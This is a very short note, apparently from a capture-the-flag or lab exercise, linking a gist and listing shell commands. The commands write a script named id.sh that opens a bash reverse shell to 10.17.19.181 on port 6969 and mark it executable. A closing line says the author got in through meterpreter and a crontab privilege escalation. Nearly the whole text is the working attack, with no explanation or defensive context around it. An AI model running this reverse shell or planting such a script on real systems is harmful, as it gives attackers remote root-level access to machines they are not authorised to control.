

https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd


echo '#!/bin/bash' > id.sh
echo 'bash -i >& /dev/tcp/10.17.19.181/6969 0>&1' >> id.sh
chmod +x id.sh

I did it via meterpreter and crontab privesc